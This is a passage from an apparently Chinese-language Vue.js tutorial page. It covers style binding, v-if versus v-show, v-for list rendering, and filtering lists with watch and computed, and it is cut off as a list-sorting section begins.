class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;fontSize:fsize+&#x27;px&#x27;&#125;&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 数组写法 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;[styleObj,styleObj2]&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 数组写法 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">name</span>:<span class="string">&#x27;cez&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">fsize</span>:<span class="number">40</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">styleObj</span>:&#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">fontSize</span>:<span class="string">&#x27;60px&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="attr">backgroundColor</span>:<span class="string">&#x27;green&#x27;</span></span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">styleObj2</span>:&#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">height</span>:<span class="string">&#x27;50px&#x27;</span></span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">styleArr</span>:[</span></span><br><span class="line"><span class="javascript">                &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">fontSize</span>:<span class="string">&#x27;60px&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">backgroundColor</span>:<span class="string">&#x27;green&#x27;</span></span></span><br><span class="line"><span class="javascript">                &#125;,</span></span><br><span class="line"><span class="javascript">                &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">height</span>:<span class="string">&#x27;50px&#x27;</span></span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            ]</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h2><h3 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h3><ul><li><p>```<br>v-if 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回 truthy 值的时候被渲</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - `v-if=&quot;表达式&quot;` </span><br><span class="line">  - `v-else-if=&quot;表达式&quot;`</span><br><span class="line">  - `v-else=&quot;表达式&quot;`</span><br><span class="line">  - 适用于切换频率较低的场景</span><br><span class="line">  - 特点：不展示的DOM元素直接被移除</span><br><span class="line">  - 注意：`v-if和v-else-if、v-else`一起使用，但要求结构不能被打断</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  v-show</span><br></pre></td></tr></table></figure><ul><li><code>v-show=&quot;表达式&quot;</code></li><li>适用于切换频率较高的场景<ul><li>特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉(<code>display:none</code>)</li></ul></li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值为&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用v-show条件渲染 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;false&quot;</span>&gt;</span>hello1,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;1===1&quot;</span>&gt;</span>hello2,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 使用v-if条件渲染 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;false&quot;</span>&gt;</span>hello1,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;1===1&quot;</span>&gt;</span>hello2,&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- v-else和v-else-if和v-else,中间不可以中断 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;n===1&quot;</span>&gt;</span>Angular<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">&quot;n===2&quot;</span>&gt;</span>React<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 中断 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;div&gt;中断&lt;/div&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">&quot;n===3&quot;</span>&gt;</span>Vue<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span>Other...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- v-if与template的配合使用 template不会破坏结构 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">&quot;n===1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>lxy<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>js<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">name</span>:<span class="string">&#x27;你好世界&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">n</span>:<span class="number">0</span></span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-if-vs-v-show"><a href="#v-if-vs-v-show" class="headerlink" title="v-if vs v-show"></a>v-if vs v-show</h3><p><code>v-if</code> 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。</p><p><code>v-if</code> 也是<strong>惰性的</strong>：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。</p><p>相比之下，<code>v-show</code> 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。</p><p>一般来说，<code>v-if</code> 有更高的切换开销，而 <code>v-show</code> 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 <code>v-show</code> 较好；如果在运行时条件很少改变，则使用 <code>v-if</code> 较好。</p><h2 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v-for指令</span><br></pre></td></tr></table></figure><ul><li>用于展示列表数据</li><li>语法：<code>v-for=&quot;(item,index) in xxx&quot; :key=&quot;yyy&quot;</code></li><li>可遍历：数组、对象、字符串(很少)、指定次数(很少)</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 遍历数组 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;p in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span>&#123;&#123;p.name&#125;&#125;--&#123;&#123;p.age&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>&#123;&#123;index&#125;&#125;--&#123;&#123;p.name&#125;&#125;--&#123;&#123;p.age&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 遍历对象 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>汽车信息<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value,key) in car&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;key&quot;</span>&gt;</span>&#123;&#123;key&#125;&#125;--&#123;&#123;value&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 遍历字符串 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>字符串<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(c,k) in str&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;k&quot;</span>&gt;</span>&#123;&#123;c&#125;&#125;--&#123;&#123;k&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 遍历指定次数 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(a,b) in 5&quot;</span>&gt;</span>&#123;&#123;a&#125;&#125;--&#123;&#123;b&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">persons</span>:[</span></span><br><span class="line"><span class="javascript">                &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">age</span>:<span class="number">18</span></span></span><br><span class="line"><span class="javascript">                &#125;,</span></span><br><span class="line"><span class="javascript">                &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">age</span>:<span class="number">19</span></span></span><br><span class="line"><span class="javascript">                &#125;,</span></span><br><span class="line"><span class="javascript">                &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                    <span class="attr">age</span>:<span class="number">20</span></span></span><br><span class="line"><span class="javascript">                &#125;,</span></span><br><span class="line"><span class="javascript">            ],</span></span><br><span class="line"><span class="javascript">            <span class="attr">car</span>:&#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">name</span>:<span class="string">&#x27;奥迪A8&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="attr">price</span>:<span class="string">&#x27;70W&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                <span class="attr">color</span>:<span class="string">&#x27;black&#x27;</span></span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">str</span>:<span class="string">&#x27;test&#x27;</span></span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="列表过滤"><a href="#列表过滤" class="headerlink" title="列表过滤"></a>列表过滤</h2><p>用watch实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 遍历数组 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyWord&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入姓名&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;p in filPersons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span>&#123;&#123;p.name&#125;&#125;--&#123;&#123;p.age&#125;&#125;--&#123;&#123;p.sex&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">keyWord</span>:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">persons</span>:[</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;温兆伦&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">            ],</span></span><br><span class="line"><span class="javascript">            <span class="attr">filPersons</span>:[]</span></span><br><span class="line"><span class="javascript">        &#125;,</span></span><br><span class="line"><span class="javascript">        <span class="attr">watch</span>:&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">keyWord</span>:&#123;</span></span><br><span class="line"><span class="javascript">                <span class="attr">immediate</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">                <span class="function"><span class="title">handler</span>(<span class="params">val</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="comment">//filter会返回一个全新的数组</span></span></span><br><span class="line"><span class="javascript">                    <span class="comment">//任意一个字符串.indexOf(&#x27;&#x27;)结果都为0</span></span></span><br><span class="line"><span class="javascript">                    <span class="built_in">this</span>.filPersons = <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123; </span></span><br><span class="line"><span class="javascript">                        <span class="keyword">return</span> p.name.indexOf(val)!==-<span class="number">1</span></span></span><br><span class="line"><span class="javascript">                    &#125;)                 </span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用computed实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">computed:&#123;</span><br><span class="line">    <span class="function"><span class="title">filPersons</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> p.name.indexOf(<span class="built_in">this</span>.keyWord)!==-<span class="number">1</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h2><ul><li>先序知识：JavaScript Array.sort()方法<ul><li>如果调用该方法时没有使用参数，将按字母顺序对数组中的元素进行排序，说得更精确点，是<strong>按照字符编码</strong>的顺序进行排序。要实现这一点，首先应把数组的元素都转换成字符串（如有必要），以便进行比较。</li><li>如果想按照其他标准进行排序，就需要提供比较函数，该函数要比较两个值，<strong>然后返回一个用于说明这两个值的相对顺序的数字</strong>。比较函数应该具有两个参数 a 和 b，其返回值如下：</li><li><strong>若 a 小于 b，在排序后的数组中 a 应该出现在 b 之前，则返回一个小于 0 的值。</strong></li><li>若 a 等于 b，则返回 0。</li><li>若 a 大于 b，则返回一个大于 0 的值。</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> =<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 遍历数组 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyWord&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入姓名&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType=2&quot;</span>&gt;</span>年龄升序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType=1&quot;</span>&gt;</span>年龄降序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType=0&quot;</span>&gt;</span>原顺序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;p in filPersons&quot;</span> <span 